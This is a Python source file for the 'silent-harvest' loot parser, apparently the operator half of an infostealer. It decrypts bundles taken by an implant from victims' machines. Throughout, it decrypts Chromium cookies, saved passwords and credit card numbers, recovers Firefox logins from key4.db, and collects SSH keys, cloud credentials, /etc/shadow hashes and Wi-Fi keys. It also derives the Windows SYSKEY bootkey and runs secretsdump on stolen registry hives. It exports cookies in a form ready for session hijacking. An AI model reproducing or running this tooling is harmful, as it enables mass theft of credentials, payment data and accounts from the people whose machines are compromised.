"""silent-harvest loot parser.

Turns a stored bundle (loot/<id>/ or a raw .bin container) into plaintext:
  - report.txt              human-readable summary
  - creds.json              machine-readable creds/cookies
  - cookies_<browser>.txt   Netscape-format cookie files (curl/Netscape import)

Handles part families:
  sysinfo.json                  implant status/victim info
  regvals.json                  registry values read via NtOpenKeyEx+RegQueryMultipleValuesW
  hive:SAM/SECURITY/SYSTEM      raw hive copies -> impacket secretsdump if installed
  b:<browser>/...               Chromium-family: Cookies / LoginData / WebData / keys
  ff:<profile>/...              Firefox: key4.db + logins.json | logins.db

Usage:
  python parse_loot.py                    # parse newest bundle in ../loot
  python parse_loot.py <bundle_dir>       # parse specific bundle dir
  python parse_loot.py --bundle file.bin  # parse standalone container
"""
import argparse
import base64
import json
import os
import shutil
import sqlite3
import struct
import subprocess
import sys
import tempfile
import time

import shcrypto
import term

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives import hashes, padding
    try:
        from cryptography.hazmat.decrepit.ciphers.algorithms import TripleDES
    except ImportError:
        from cryptography.hazmat.primitives.ciphers.algorithms import TripleDES
    HAVE_CRYPTO = True
except ImportError:
    HAVE_CRYPTO = False

CHROME_EPOCH_DELTA = 11644473600  # seconds between 1601-01-01 and 1970-01-01


# --------------------------------------------------------------------------
# sensitive-output controls
# --------------------------------------------------------------------------
def redact_value(v):
    """Mask a secret for --redact mode: keep shape, drop content."""
    s = str(v)
    if len(s) <= 6:
        return "*" * len(s)
    return "%s...%s(%d)" % (s[:3], s[-2:], len(s))


def apply_redaction(creds):
    for c in creds.get("cookies", []):
        if c.get("value"):
            c["value"] = redact_value(c["value"])
    for p in creds.get("passwords", []):
        if p.get("password"):
            p["password"] = redact_value(p["password"])
        if p.get("secfields_raw"):
            p["secfields_raw"] = redact_value(p["secfields_raw"])
    for c in creds.get("cards", []):
        if c.get("number") and not str(c["number"]).startswith("<"):
            c["number"] = redact_value(c["number"])
    for c in creds.get("cloud", []):
        if c.get("content"):
            c["content"] = redact_value(c["content"])
    creds.pop("secretsdump", None)  # never leave raw hash dumps in redacted mode


def restrict_outputs(bundle_dir):
    """0600 on plaintext outputs where the OS supports it (no-op on Windows)."""
    if os.name != "posix":
        return
    for name in ("report.txt", "creds.json", "manifest.json"):
        p = os.path.join(bundle_dir, name)
        if os.path.exists(p):
            os.chmod(p, 0o600)
    cd = os.path.join(bundle_dir, "cookies")
    for root, _, files in os.walk(bundle_dir):
        for f in files:
            if f.startswith("cookies_"):
                os.chmod(os.path.join(root, f), 0o600)


def prune_old_bundles(loot_dir, days):
    removed = 0
    cutoff = time.time() - days * 86400
    for d in os.listdir(loot_dir):
        p = os.path.join(loot_dir, d)
        marker = os.path.join(p, "bundle.bin")
        if os.path.isdir(p) and os.path.exists(marker):
            if os.path.getmtime(marker) < cutoff:
                shutil.rmtree(p, ignore_errors=True)
                removed += 1
    # rebuild the index without purged entries
    idx = os.path.join(loot_dir, "index.jsonl")
    if removed and os.path.exists(idx):
        keep = set(d for d in os.listdir(loot_dir)
                   if os.path.isdir(os.path.join(loot_dir, d)))
        with open(idx) as f:
            lines = [ln for ln in f if ln.strip()]
        with open(idx, "w") as f:
            f.writelines(ln for ln in lines
                         if json.loads(ln).get("id") in keep)
    return removed


def shred_bundle(target):
    """Best-effort overwrite-then-delete for a bundle dir (or 'all')."""
    loot = os.path.abspath(os.path.join(
        os.path.dirname(os.path.abspath(__file__)), "..", "loot"))
    targets = []
    if target == "all":
        targets = [os.path.join(loot, d) for d in os.listdir(loot)
                   if os.path.isdir(os.path.join(loot, d))]
    elif os.path.isabs(target) or os.path.isdir(target):
        targets = [target]
    else:
        targets = [os.path.join(loot, target)]
    n = 0
    for t in targets:
        if not os.path.isdir(t):
            continue
        for root, _, files in os.walk(t):
            for f in files:
                p = os.path.join(root, f)
                try:
                    sz = os.path.getsize(p)
                    with open(p, "r+b") as fh:
                        fh.write(os.urandom(min(sz, 1 << 22)))
                        fh.flush()
                        os.fsync(fh.fileno())
                except OSError:
                    pass
        shutil.rmtree(t, ignore_errors=True)
        n += 1
    return n


# --------------------------------------------------------------------------
# helpers
# --------------------------------------------------------------------------
def chrome_time_to_unix(v):
    try:
        if v <= 0:
            return 0
        return int(v / 1000000) - CHROME_EPOCH_DELTA
    except Exception:
        return 0


def aesgcm_decrypt_chromium(key, blob):
    """Decrypt a Chromium v10/v11 encrypted_value blob (Windows scheme). Returns (ok, value)."""
    if blob is None or len(blob) < 3 + 12 + 16 + 1:
        return False, b""
    prefix = bytes(blob[:3])
    iv = bytes(blob[3:15])
    ct = bytes(blob[15:-16])
    tag = bytes(blob[-16:])
    try:
        pt = AESGCM(key).decrypt(iv, ct + tag, None)
        return True, pt
    except Exception:
        return False, b""


LINUX_V10_IV = b" " * 16
LINUX_V10_SALT = b"saltysalt"


def linux_chromium_key(password):
    """Chromium on Linux/macOS: PBKDF2-HMAC-SHA1(pw, 'saltysalt', 1 iter, 16B)."""
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    kdf = PBKDF2HMAC(algorithm=hashes.SHA1(), length=16,
                     salt=LINUX_V10_SALT, iterations=1)
    return kdf.derive(password.encode() if isinstance(password, str) else password)


def linux_v10_decrypt(password, blob):
    """Decrypt a Linux/macOS Chromium v10/v11 blob: AES-128-CBC, IV=16 spaces."""
    if blob is None or len(blob) < 3 + 16:
        return False, b""
    if bytes(blob[:3]) not in (b"v10", b"v11"):
        return False, b""
    ct = bytes(blob[3:])
    if len(ct) == 0 or len(ct) % 16 != 0:
        return False, b""
    try:
        key = linux_chromium_key(password)
        dec = Cipher(algorithms.AES(key), modes.CBC(LINUX_V10_IV)).decryptor()
        pt = dec.update(ct) + dec.finalize()
        unp = padding.PKCS7(128).unpadder()
        pt = unp.update(pt) + unp.finalize()
        return True, pt
    except Exception:
        return False, b""


# --------------------------------------------------------------------------
# Chromium family
# --------------------------------------------------------------------------
def parse_chromium(parts, report, creds):
    import sqlite3

    browsers = set()
    for name in parts:
        if name.startswith("b:") and "/" in name:
            browsers.add(name[2:].split("/", 1)[0])
    if not browsers:
        return

    for browser in sorted(browsers):
        platform = str(creds.get("victim", {}).get("platform", "windows")).lower()
        is_unix = platform in ("linux", "macos")
        # v11 on unix is the keyring-password variant of the same CBC scheme;
        # v11 on windows is app-bound. v20 is app-bound/new-gen everywhere.
        appbound_prefixes = (b"v20",) if is_unix else (b"v11", b"v20")

        def decrypt_blob(browser_key, enc):
            if is_unix:
                return linux_v10_decrypt(browser_key, enc)
            return aesgcm_decrypt_chromium(browser_key, enc)

        key = None
        if is_unix:
            pw_raw = parts.get("b:%s/linux_password" % browser)
            key = pw_raw.decode("utf-8", "replace").strip() if pw_raw else "peanuts"
            report.append("[%s] linux chromium key: derived from %s" % (
                browser, "keyring (secret-tool)" if pw_raw else "'peanuts' fallback"))
        else:
            key_raw = parts.get("b:%s/aeskey.bin" % browser)
            if key_raw and len(key_raw) == 32:
                key = key_raw
                report.append("[%s] AES-256 os_crypt key: RECOVERED (DPAPI unwrap ok)" % browser)
            else:
                report.append("[%s] AES key: NOT recovered (encrypted blobs will stay ciphertext)" % browser)

        abe = parts.get("b:%s/ABEkey.bin" % browser)
        if abe and len(abe) == 32:
            report.append("[%s] app-bound (v11) key: RECOVERED (%d bytes)" % (browser, len(abe)))

        ls = parts.get("b:%s/LocalState" % browser)
        if ls:
            try:
                j = json.loads(ls.decode("utf-8", "replace"))
                enc_key = j.get("os_crypt", {}).get("encrypted_key", "")
                report.append("[%s] Local State: encrypted_key present=%s (len %d)"
                              % (browser, bool(enc_key), len(enc_key)))
            except Exception:
                pass

        profiles = set()
        for name in parts:
            if name.startswith("b:%s/" % browser) and name.count("/") >= 2:
                profiles.add(name.split("/")[1])
        for prof in sorted(profiles):
            # ---- cookies ----
            cookies_part = parts.get("b:%s/%s/Cookies" % (browser, prof))
            if cookies_part:
                n_ok = n_fail = n_plain = n_ab = 0
                rows_out = []
                netscape = []
                try:
                    db = sqlite_bytes_connect(cookies_part)
                    cur = db.execute("SELECT host_key,name,encrypted_value,path,"
                                     "expires_utc,is_secure,is_httponly FROM cookies")
                    for host, cname, enc, path, exp, sec, http in cur.fetchall():
                        val = b""
                        ok = False
                        if enc:
                            prefix = bytes(enc[:3])
                            if prefix in appbound_prefixes:
                                # app-bound encrypted (Chrome >=127 / 2025 v20 gen):
                                # key lives behind the elevation service; raw ABE
                                # blob is exfiltrated for offline/SYSTEM unwrap
                                n_ab += 1
                                rows_out.append({
                                    "host": host, "name": cname, "value": "",
                                    "path": path, "expires": chrome_time_to_unix(exp),
                                    "secure": bool(sec), "httponly": bool(http),
                                    "decrypted": False, "appbound": True,
                                })
                                continue
                            if key:
                                ok, val = decrypt_blob(key, enc)
                        if ok:
                            n_ok += 1
                        elif enc:
                            n_fail += 1
                        else:
                            n_plain += 1
                        rows_out.append({
                            "host": host, "name": cname, "value": val.decode("utf-8", "replace"),
                            "path": path, "expires": chrome_time_to_unix(exp),
                            "secure": bool(sec), "httponly": bool(http),
                            "decrypted": bool(ok),
                        })
                        if ok or not enc:
                            sub = "TRUE" if str(host).startswith(".") else "FALSE"
                            netscape.append("%s\t%s\t%s\t%s\t%d\t%s\t%s" % (
                                host, sub, path or "/", "TRUE" if sec else "FALSE",
                                max(chrome_time_to_unix(exp), 0), cname,
                                val.decode("utf-8", "replace")))
                    db.close()
                except Exception as e:
                    report.append("[%s/%s] cookies DB unreadable: %s" % (browser, prof, e))
                creds.setdefault("cookies", []).extend(rows_out)
                if rows_out:
                    with open(cookie_out_path(browser, prof), "w", encoding="utf-8") as f:
                        f.write("\n".join(netscape) + "\n")
                report.append("[%s/%s] cookies: %d total (decrypted=%d, plaintext=%d, "
                              "app-bound v11/v20=%d, failed=%d)"
                              % (browser, prof, len(rows_out), n_ok, n_plain, n_ab, n_fail))

            # ---- saved passwords ----
            logins_part = parts.get("b:%s/%s/LoginData" % (browser, prof))
            if logins_part:
                out = []
                try:
                    db = sqlite_bytes_connect(logins_part)
                    # chromium schema: password_value holds the encrypted blob
                    cur = db.execute("SELECT origin_url,action_url,username_value,"
                                     "password_value,date_created FROM logins")
                    for origin, action, user, enc, created in cur.fetchall():
                        pw = ""
                        ok = False
                        if enc and key:
                            ok, pwraw = decrypt_blob(key, enc)
                            pw = pwraw.decode("utf-8", "replace") if ok else "<undecryptable>"
                        elif not enc:
                            pw = ""
                        else:
                            pw = "<no key>"
                        out.append({"url": origin, "action": action, "user": user,
                                    "password": pw, "decrypted": bool(ok),
                                    "created": chrome_time_to_unix(created)})
                    db.close()
                except Exception as e:
                    report.append("[%s/%s] Login Data unreadable: %s" % (browser, prof, e))
                if out:
                    creds.setdefault("passwords", []).extend(out)
                report.append("[%s/%s] saved logins: %d" % (browser, prof, len(out)))

            # ---- autofill / cards ----
            web_part = parts.get("b:%s/%s/WebData" % (browser, prof))
            if web_part:
                try:
                    db = sqlite_bytes_connect(web_part)
                    try:
                        af = db.execute("SELECT name,value FROM autofill").fetchall()
                        if af:
                            creds.setdefault("autofill", []).extend(
                                {"field": n, "value": v} for n, v in af)
                        report.append("[%s/%s] autofill entries: %d" % (browser, prof, len(af)))
                    except Exception:
                        pass
                    try:
                        cards = db.execute("SELECT name_on_card,expiration_month,"
                                           "expiration_year,card_number_encrypted "
                                           "FROM credit_cards").fetchall()
                        ncard = 0
                        for nm, mth, yr, enc in cards:
                            num = "<encrypted/no key>"
                            if enc and key:
                                ok, raw = decrypt_blob(key, enc)
                                if ok:
                                    num = raw.decode("utf-8", "replace")
                                    ncard += 1
                            creds.setdefault("cards", []).append(
                                {"name": nm, "exp": "%02d/%04d" % (mth or 0, yr or 0), "number": num})
                        report.append("[%s/%s] credit cards: %d (decrypted %d)"
                                      % (browser, prof, len(cards), ncard))
                    except Exception:
                        pass
                    db.close()
                except Exception:
                    pass


COOKIE_DIR = None


def cookie_out_path(browser, prof):
    safe = ("%s_%s" % (browser, prof)).replace("/", "_")
    return os.path.join(COOKIE_DIR, "cookies_%s.txt" % safe)


def sqlite_bytes_connect(data):
    """Open a sqlite DB from bytes without touching disk more than once."""
    import sqlite3
    path = os.path.join(tempfile.gettempdir(), "sh_%d.db" % abs(hash(data)))
    with open(path, "wb") as f:
        f.write(data)
    # immutable=1 avoids journal/lock issues on the copy
    conn = sqlite3.connect("file:%s?immutable=1" % path.replace("?", "%3f"), uri=True)
    conn.text_factory = lambda b: b.decode("utf-8", "replace")
    return conn


# --------------------------------------------------------------------------
# Firefox family
# --------------------------------------------------------------------------
class ASN1Error(Exception):
    pass


def der_parse(buf, off=0):
    """Minimal DER walker -> (tag, value_bytes, next_off). Supports short+long lengths."""
    if off >= len(buf):
        raise ASN1Error("truncated")
    tag = buf[off]
    off += 1
    l = buf[off]
    off += 1
    if l & 0x80:
        n = l & 0x7F
        if n == 0 or off + n > len(buf):
            raise ASN1Error("bad length")
        l = int.from_bytes(buf[off:off + n], "big")
        off += n
    if off + l > len(buf):
        raise ASN1Error("overrun")
    return tag, buf[off:off + l], off + l


def der_expect(tag_want, buf, off):
    tag, val, nxt = der_parse(buf, off)
    if tag != tag_want:
        raise ASN1Error("tag %02x != %02x" % (tag, tag_want))
    return val, nxt


def nss_kdf(global_salt, entry_salt, iterations, keylen):
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=keylen,
                     salt=entry_salt, iterations=iterations)
    return kdf.derive(global_salt + b"")


def aes_cbc_dec(key, iv, ct):
    dec = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
    return dec.update(ct) + dec.finalize()


def des3_cbc_dec(key, iv, ct):
    dec = Cipher(TripleDES(key), modes.CBC(iv)).decryptor()
    pt = dec.update(ct) + dec.finalize()
    unp = padding.PKCS7(64).unpadder()  # 64 *bits* = 8-byte 3DES block
    try:
        pt = unp.update(pt) + unp.finalize()
    except Exception:
        pass
    return pt


def parse_nss_pbes2(blob):
    """Parse NSS PBES2 ASN.1 blob -> (entry_salt, iterations, keylen, iv, ciphertext).

    SEQUENCE {                          <- PBES2 outer
      SEQUENCE {                        <- AlgorithmIdentifier
        OID pkcs5-PBES2
        SEQUENCE {                      <- params
          SEQUENCE { OID PBKDF2, SEQUENCE { OCTET salt, INT iter, INT keylen, SEQ{prf} } }
          SEQUENCE { OID aes256-CBC, OCTET iv }
        }
      }
      OCTET ciphertext
    }
    """
    seq, _ = der_expect(0x30, blob, 0)
    algid, off_ct = der_expect(0x30, seq, 0)
    _oid_pbes2, o1 = der_expect(0x06, algid, 0)
    params, _o2 = der_expect(0x30, algid, o1)
    kdf, k0 = der_expect(0x30, params, 0)
    enc, _k_after = der_expect(0x30, params, k0)
    _oid_pbkdf2, k1 = der_expect(0x06, kdf, 0)
    kdfparams, k2 = der_expect(0x30, kdf, k1)
    entry_salt, p1 = der_expect(0x04, kdfparams, 0)
    iterations, p2 = der_expect(0x02, kdfparams, p1)
    keylen = 32
    try:
        kl, _p3 = der_expect(0x02, kdfparams, p2)
        keylen = int.from_bytes(kl, "big")
    except ASN1Error:
        pass
    _oid_aes, e1 = der_expect(0x06, enc, 0)
    iv, _e2 = der_expect(0x04, enc, e1)
    ct, _ = der_expect(0x04, seq, off_ct)
    return (bytes(entry_salt), int.from_bytes(iterations, "big"),
            keylen, bytes(iv), bytes(ct))


def firefox_key_from_key4(key4_bytes):
    """Derive the 3DES login key from a key4.db copy. Returns key bytes or None."""
    try:
        db = sqlite_bytes_connect(key4_bytes)
        row = db.execute("SELECT item1,item2 FROM metadata WHERE id='password'").fetchone()
        if not row:
            return None, "metadata table empty"
        global_salt, item2 = bytes(row[0]), bytes(row[1])
        # password check -> validates the KDF path (NSS uses a fixed IV of
        # 16 spaces for these wrapped blobs; the ASN.1 IV field is vestigial
        # and sometimes shorter than a block)
        salt, it, klen, iv, ct = parse_nss_pbes2(item2)
        if len(iv) != 16:
            iv = b" " * 16
        k = nss_kdf(global_salt, salt, it, klen)
        check = aes_cbc_dec(k, iv, ct)
        ok_check = b"password-check" in check
        # main key from nssPrivate a11
        keys = []
        for (a11,) in db.execute("SELECT a11 FROM nssPrivate").fetchall():
            try:
                salt, it, klen, iv, ct2 = parse_nss_pbes2(bytes(a11))
                if len(iv) != 16:
                    iv = b" " * 16
                k2 = nss_kdf(global_salt, salt, it, klen)
                pt = aes_cbc_dec(k2, iv, ct2)
                # decrypted structure: 24-byte 3DES key follows a known filler
                if len(pt) >= 24:
                    keys.append(pt[:24] if len(pt) == 24 else pt[-24:] if b"\x00" in pt[:4] else pt[:24])
            except Exception:
                continue
        db.close()
        if keys:
            return keys[0], ("password-check=%s" % ("OK" if ok_check else "FAIL"))
        return None, "no decryptable a11 entry (password-check=%s)" % ("OK" if ok_check else "FAIL")
    except Exception as e:
        return None, "key4.db error: %s" % e


def firefox_decrypt_field(key3des, data):
    if not data:
        return ""
    data = bytes(data)
    return des3_cbc_dec(key3des, data[:8], data[8:]).decode("utf-8", "replace").rstrip("\x00")


def parse_firefox(parts, report, creds):
    profiles = set()
    for name in parts:
        if name.startswith("ff:") and "/" in name:
            profiles.add(name[3:].split("/", 1)[0])
    for prof in sorted(profiles):
        key4 = parts.get("ff:%s/key4.db" % prof)
        if not key4:
            continue
        key, note = firefox_key_from_key4(key4)
        report.append("[firefox:%s] key4.db -> 3DES key %s (%s)"
                      % (prof, "RECOVERED" if key else "FAILED", note))
        if not key:
            continue

        entries = []
        lj = parts.get("ff:%s/logins.json" % prof)
        ldb = parts.get("ff:%s/logins.db" % prof)
        if lj:
            try:
                j = json.loads(lj.decode("utf-8", "replace"))
                for e in j.get("logins", []):
                    entries.append((
                        e.get("formSubmitURL") or e.get("hostname"),
                        e.get("hostname", ""),
                        base64.b64decode(e.get("encryptedUsername", "")),
                        base64.b64decode(e.get("encryptedPassword", "")),
                    ))
            except Exception as e:
                report.append("[firefox:%s] logins.json error: %s" % (prof, e))
        if ldb:
            try:
                db = sqlite_bytes_connect(ldb)
                # new Rust LoginStore schema: loginsL (local) / loginsM (mirror)
                rows = []
                for t in ("loginsL", "loginsM"):
                    try:
                        for origin, fsu, sec, deleted in db.execute(
                                "SELECT origin,formActionOrigin,secFields,is_deleted "
                                "FROM %s" % t).fetchall():
                            if not deleted:
                                rows.append((fsu or origin, origin, sec or b"", b""))
                    except sqlite3.OperationalError:
                        pass
                db.close()
                # secFields is an opaque encrypted JSON blob in the new store;
                # store raw for offline work and attempt classic 3DES unwrap
                for form, host, sec, _ in rows:
                    creds.setdefault("passwords", []).append({
                        "url": form or host, "browser": "firefox:" + prof,
                        "secfields_raw": sec.decode("utf-8", "replace")
                        if isinstance(sec, (str, bytes)) else str(sec),
                        "note": "new LoginStore secFields (encrypted JSON)",
                    })
                if rows:
                    report.append("[firefox:%s] new LoginStore logins: %d (secFields stored raw; "
                                  "classic decrypt N/A for this format)" % (prof, len(rows)))
            except Exception as e:
                report.append("[firefox:%s] logins.db error: %s" % (prof, e))

        good = 0
        for form, host, eu, ep in entries:
            u = firefox_decrypt_field(key, eu)
            p = firefox_decrypt_field(key, ep)
            if u or p:
                good += 1
            creds.setdefault("passwords", []).append({
                "url": form or host, "user": u, "password": p, "browser": "firefox:" + prof,
            })
        report.append("[firefox:%s] logins: %d (%d decrypted)" % (prof, len(entries), good))


# --------------------------------------------------------------------------
# Linux artifacts
# --------------------------------------------------------------------------
def parse_linux(parts, report, creds):
    ssh, cloud, shadow, nm, hist = [], [], {}, [], []
    for name, data in parts.items():
        if not name.startswith("linux:"):
            continue
        try:
            text = data.decode("utf-8", "replace")
        except Exception:
            text = ""

        if name.startswith("linux:ssh/") or name.startswith("linux:gnupg/"):
            first = text.strip().splitlines()[0] if text.strip() else ""
            creds.setdefault("keyfiles", []).append(
                {"name": name, "size": len(data), "head": first[:60]})
            ssh.append("%s (%d bytes) %s" % (name, len(data), first[:40]))
            if "PRIVATE KEY" in text:
                creds.setdefault("private_keys", []).append(name)

        elif name.startswith("linux:file/"):
            report.append("[linux] %s: %d bytes" % (name, len(data)))
            creds.setdefault("cloud", []).append(
                {"name": name.split("/", 2)[-1], "content": text})
            if "aws" in name:
                for line in text.splitlines():
                    line = line.strip()
                    if line.startswith("aws_access_key_id"):
                        cloud.append(line)

        elif name.startswith("linux:etc/shadow"):
            for line in text.splitlines():
                f = line.split(":")
                if len(f) > 1 and f[1] and f[1] not in ("!", "*", "x"):
                    shadow[f[0]] = f[1]
            if shadow:
                report.append("[linux] /etc/shadow: %d accounts with password hashes"
                              % len(shadow))
                creds["shadow"] = shadow

        elif name.startswith("linux:nm/"):
            for line in text.splitlines():
                line = line.strip()
                if line.startswith("psk="):
                    nm.append("%s %s" % (name.split("/", 1)[1], line))
            if nm:
                report.append("[linux] NetworkManager: %d connection files, psk found"
                              % len([n for n in parts if n.startswith("linux:nm/")]))

        elif name.startswith("linux:history/"):
            nlines = len(text.splitlines())
            report.append("[linux] %s: %d lines (tail)" % (name, nlines))
            creds.setdefault("history", []).append(
                {"name": name, "lines": text.splitlines()[-50:]})

        elif name.startswith("linux:keyring/"):
            report.append("[linux] keyring file %s: %d bytes (stored raw)"
                          % (name.split("/", 1)[1], len(data)))

    if ssh:
        report.append("[linux] key files: %d" % len(ssh))
    if cloud:
        report.append("[linux] cloud cred lines: %d" % len(cloud))
    if nm:
        creds.setdefault("wifi", []).extend(nm)



def parse_regvals(parts, report, creds):
    rv = parts.get("regvals.json")
    if not rv:
        return
    try:
        doc = json.loads(rv.decode("utf-8", "replace"))
    except Exception as e:
        report.append("regvals.json unreadable: %s" % e)
        return
    creds["registry"] = {}
    for ntpath, values in doc.items():
        if ntpath.startswith("_"):
            continue
        if not isinstance(values, dict):
            continue
        report.append("[reg] %s" % ntpath)
        # status entries (strings) vs value entries
        for name, v in values.items():
            if isinstance(v, dict):
                raw = base64.b64decode(v.get("b64", ""))
                preview = raw[:16].hex() + ("..." if len(raw) > 16 else "")
                report.append("    %-40s type=%-3d len=%-6d %s" % (name, v.get("type", 0), len(raw), preview))
                creds["registry"].setdefault(ntpath, {})[name] = raw.hex()
            else:
                report.append("    %-40s %s" % (name, v))
                creds["registry"].setdefault(ntpath, {})[name] = v

    # assemble the syskey bootkey if all four class components are present
    comps = {}
    for ntpath, values in creds.get("registry", {}).items():
        low = ntpath.lower()
        for part in ("jd", "skew1", "gbg", "data"):
            if low.endswith("\\lsa\\" + part) and "<class>" in values:
                try:
                    comps[part] = bytes.fromhex(values["<class>"]).decode("utf-16-le")
                except Exception:
                    pass
    if all(p in comps for p in ("jd", "skew1", "gbg", "data")):
        try:
            raw = bytes.fromhex(comps["jd"] + comps["skew1"] + comps["gbg"] + comps["data"])
            if len(raw) == 16:
                perm = [8, 5, 4, 2, 11, 9, 13, 3, 0, 10, 1, 15, 14, 6, 7, 12]
                bootkey = bytes(raw[i] for i in perm)
                creds["bootkey"] = bootkey.hex()
                report.append("    %-40s %s" % ("SYSKEY BOOTKEY (descrambled)",
                                                bootkey.hex()))
        except ValueError:
            pass


def parse_hives(parts, report, creds, bundle_dir):
    hives = {}
    for h in ("SAM", "SECURITY", "SYSTEM"):
        p = parts.get("hive:%s" % h)
        if p:
            hives[h] = p
    if not hives:
        return
    out_dir = os.path.join(bundle_dir, "hives")
    os.makedirs(out_dir, exist_ok=True)
    paths = {}
    for h, data in hives.items():
        fp = os.path.join(out_dir, "%s.hive" % h)
        with open(fp, "wb") as f:
            f.write(data)
        paths[h] = fp
        report.append("[hive] %s saved (%d bytes) -> %s" % (h, len(data), fp))

    sd = find_secretsdump()
    if sd and all(h in paths for h in ("SAM", "SECURITY", "SYSTEM")):
        out_file = os.path.join(bundle_dir, "secretsdump.txt")
        try:
            r = subprocess.run(
                [sd, "-sam", paths["SAM"], "-system", paths["SYSTEM"],
                 "-security", paths["SECURITY"], "LOCAL"],
                capture_output=True, text=True, timeout=120)
            with open(out_file, "w") as f:
                f.write(r.stdout + "\n" + r.stderr)
            creds["secretsdump"] = r.stdout
            report.append("[hive] secretsdump output -> %s (%d chars)" % (out_file, len(r.stdout)))
        except Exception as e:
            report.append("[hive] secretsdump failed: %s" % e)
    else:
        report.append("[hive] impacket/secretsdump not found - hives stored for offline cracking:")
        report.append("      secretsdump.py -sam hives/SAM.hive -system hives/SYSTEM.hive "
                      "-security hives/SECURITY.hive LOCAL")


def find_secretsdump():
    for name in ("secretsdump.py", "secretsdump.exe", "secretsdump"):
        p = shutil.which(name)
        if p:
            return p
    return None


# --------------------------------------------------------------------------
def colorize_report_line(line):
    """Style a report line for terminal display."""
    if line.startswith("==="):
        return term.s(line, term.C.BOLD, term.C.CYAN)
    if "RECOVERED" in line or line.startswith("[ok"):
        return term.s(line, term.C.GREEN)
    if "ACCESS_DENIED" in line or "FAILED" in line or "unreadable" in line:
        return term.s(line, term.C.RED)
    if "app-bound" in line or "not decryptable" in line or "WARN" in line:
        return term.s(line, term.C.YELLOW)
    if "BOOTKEY" in line:
        return term.s(line, term.C.MAGENTA, term.C.BOLD)
    if line.startswith("    ") or line.startswith("  "):
        return term.s(line, term.C.GREY)
    return line


def parse_bundle(bundle_dir, psk, redact=False):
    global COOKIE_DIR
    bundle_file = os.path.join(bundle_dir, "bundle.bin")
    if not os.path.exists(bundle_file):
        raise SystemExit("no bundle.bin in %s" % bundle_dir)
    with open(bundle_file, "rb") as f:
        blob = f.read()
    manifest, parts = shcrypto.unpack(blob, psk)
    COOKIE_DIR = bundle_dir

    report = []
    creds = {"victim": manifest.get("victim", {})}

    si = parts.get("sysinfo.json")
    if si:
        report.append("=== sysinfo ===")
        for line in si.decode("utf-8", "replace").strip().splitlines():
            report.append("  " + line)

    report.append("=== registry (NtOpenKeyEx + RegQueryMultipleValuesW) ===")
    parse_regvals(parts, report, creds)

    report.append("=== browsers (chromium family) ===")
    if HAVE_CRYPTO:
        parse_chromium(parts, report, creds)
    else:
        report.append("cryptography package missing - browser decryption skipped")

    report.append("=== linux artifacts ===")
    parse_linux(parts, report, creds)

    report.append("=== browsers (firefox) ===")
    if HAVE_CRYPTO:
        parse_firefox(parts, report, creds)

    report.append("=== hives ===")
    parse_hives(parts, report, creds, bundle_dir)

    report_txt = os.path.join(bundle_dir, "report.txt")
    with open(report_txt, "w", encoding="utf-8") as f:
        f.write("\n".join(report) + "\n")
    if redact:
        apply_redaction(creds)
    with open(os.path.join(bundle_dir, "creds.json"), "w", encoding="utf-8") as f:
        json.dump(creds, f, indent=2, default=str)
    if redact:
        # drop plaintext cookie exports entirely in redacted mode
        for root, _, files in os.walk(bundle_dir):
            for fn in files:
                if fn.startswith("cookies_") and fn.endswith(".txt"):
                    os.remove(os.path.join(root, fn))
    else:
        restrict_outputs(bundle_dir)
    return report, report_txt


def main():
    ap = argparse.ArgumentParser(
        description="decrypt + parse silent-harvest bundles; see --help for "
                    "sensitive-data controls (--redact, --prune-days, --shred)")
    ap.add_argument("target", nargs="?", default=None,
                    help="bundle dir under loot/ (default: newest)")
    ap.add_argument("--bundle", default=None, help="parse a standalone .bin container")
    ap.add_argument("--psk", default=None)
    ap.add_argument("--redact", action="store_true",
                    help="mask secrets in creds.json, drop plaintext cookie "
                         "exports (for triage/reporting without exposure)")
    ap.add_argument("--prune-days", type=int, default=None, metavar="N",
                    help="delete bundles older than N days, then exit")
    ap.add_argument("--shred", default=None, metavar="DIR|all",
                    help="overwrite + delete a bundle dir (or all), then exit")
    ap.add_argument("--no-color", action="store_true",
                    help="disable colored output (also honored via NO_COLOR env)")
    args = ap.parse_args()

    if args.no_color:
        os.environ["NO_COLOR"] = "1"
    term.init()

    psk = shcrypto.get_psk(args.psk)

    base = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "loot")
    if args.shred:
        n = shred_bundle(args.shred)
        print("shredded %d bundle dir(s)" % n)
        return
    if args.prune_days is not None:
        n = prune_old_bundles(base, args.prune_days)
        print("pruned %d bundle(s) older than %d days" % (n, args.prune_days))
        return

    if args.bundle:
        dest = os.path.splitext(args.bundle)[0] + "_parsed"
        os.makedirs(dest, exist_ok=True)
        shutil.copy(args.bundle, os.path.join(dest, "bundle.bin"))
        report, rp = parse_bundle(dest, psk, redact=args.redact)
    else:
        target = args.target
        if target and os.path.isdir(target):
            bundle_dir = target
        else:
            base = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "loot")
            cands = sorted(
                [os.path.join(base, d) for d in os.listdir(base)
                 if os.path.isdir(os.path.join(base, d)) and
                 os.path.exists(os.path.join(base, d, "bundle.bin"))],
                key=lambda d: os.path.getmtime(os.path.join(d, "bundle.bin")))
            if not cands:
                raise SystemExit("no bundles found under %s" % base)
            bundle_dir = cands[-1]
        report, rp = parse_bundle(bundle_dir, psk, redact=args.redact)

    for line in report:
        print(colorize_report_line(line))
    print()
    term.cprint("report → %s%s" % (rp, "  [REDACTED]" if args.redact else ""),
                term.C.GREEN, term.C.BOLD)


if __name__ == "__main__":
    main()
